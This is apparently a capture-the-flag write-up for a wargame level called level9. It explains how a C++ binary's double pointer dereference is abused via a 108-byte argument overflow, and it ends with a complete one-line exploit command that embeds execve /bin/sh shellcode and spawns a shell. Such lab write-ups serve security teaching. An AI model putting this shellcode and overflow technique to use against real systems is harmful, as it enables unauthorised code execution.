cpp binary

needs at least one argument

we find the offset of the first argument (108 bytes)

eax is dereferenced twice, the second time its value is put inside edx, edx's value is then called

let's try and put some shellcode in edx's value

exploit = | this_address + 4 | shellocde | buffer_to_overflow | this_address 

to find this_address, we just check the address of eax at *0x804867c since it's where the dereferences happen

shellcode is the same as in level2: http://shell-storm.org/shellcode/files/shellcode-575.php

./level9 `python -c 'print("\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08")'`

we are inside a shell !
